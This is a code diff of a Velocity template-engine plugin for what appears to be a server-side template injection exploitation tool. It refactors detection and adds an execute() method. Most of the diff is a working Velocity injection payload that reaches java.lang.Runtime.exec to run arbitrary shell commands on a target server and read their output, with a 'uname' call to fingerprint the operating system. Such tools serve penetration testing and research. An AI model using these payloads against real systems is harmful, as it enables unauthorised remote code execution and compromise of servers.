@@ -4,79 +4,42 @@ from utils import rand
 import string
 
 class Velocity(Check):
-    
-    def detect(self):
-        
-        # Declare payload
-        self.base_tag = '#set($p=%s)\n$p'
-        
-        self.req_header_rand = str(rand.randint_n(4))
-        self.req_trailer_rand = str(rand.randint_n(4))
-        
-        # Skip reflection check if same tag has been detected before
-        if self.get('reflect_tag') != self.base_tag:
-            self._check_engine()
-        
-        self._check_engine()
-    
-        # Return if reflect_tag is not set
-        if not self.get('reflect_tag'):
-            return
-            
-        log.warn('Reflection detected')
-        log.warn('Velocity engine detected')
 
-        # I've tested the techniques described in this article
-        # http://blog.portswigger.net/2015/08/server-side-template-injection.html
-        # for it didn't work. Still keeping the check active to cover previous
-        # affected versions.
-
-        self._check_os()
+    render_tag = '#set($p=%(payload)s)\n$p\n'
+    header_tag = '#set($h=%(header)s)\n$h\n'
+    trailer_tag = '\n#set($t=%(trailer)s)\n$t'
+    contexts = [ ]
         
-        if not self.get('exec'):
-            return
-            
-        log.warn(
-            'Shell command execution detected on \'%s\' operating system' % (
-                self.get('os', 'undetected')
-            )
-        )
+    def detect_engine(self):
 
-    def _check_engine(self):
-        
         expected_rand = str(rand.randint_n(1))
-        payload = self.base_tag % (expected_rand)
-        
-        if expected_rand == self.req(payload):
-            self.set('reflect_tag', self.base_tag)
+        payload = '#set($p=%(payload)s)\n$p\n' % ({ 'payload': expected_rand })
+
+        if expected_rand == self.inject(payload):
             self.set('language', 'java')
             self.set('engine', 'velocity')
-                      
-    def _check_os(self):
-    
+
+   # I've tested the techniques described in this article
+   # http://blog.portswigger.net/2015/08/server-side-template-injection.html
+   # for it didn't work. Still keeping the check active to cover previous
+   # affected versions.
+
+    def detect_exec(self):
+
         expected_rand = str(rand.randint_n(2))
-        
-        payload = """#set($str=$class.inspect("java.lang.String").type)
+
+        if expected_rand == self.execute('echo %s' % expected_rand):
+            self.set('exec', True)
+            self.set('os', self.execute("uname"))
+
+    def execute(self, command):
+
+        # TODO: quote command
+        return self.inject("""#set($str=$class.inspect("java.lang.String").type)
 #set($chr=$class.inspect("java.lang.Character").type)
-#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("echo %s"))
+#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("%s"))
 $ex.waitFor()
 #set($out=$ex.getInputStream())
 #foreach($i in [1..$out.available()])
 $str.valueOf($chr.toChars($out.read()))
-#end""" % expected_rand
-        
-        if expected_rand == self.req(payload):
-            self.set('exec', True)      
-               
-
-    def req(self, payload):
-        
-        rand_header = str(rand.randint_n(4))      
-        rand_trailer = str(rand.randint_n(4))
-        req_header = """#set($h=%s)\n#set($t=%s)\n$h\n""" % (rand_header, rand_trailer)
-        req_trailer = "\n$t"
-        
-        response = self.channel.req(req_header + payload + req_trailer)
-        before,_,result = response.partition(rand_header)
-        result,_,after = result.partition(rand_trailer)
-        return result.strip()
+#end""" % (command))
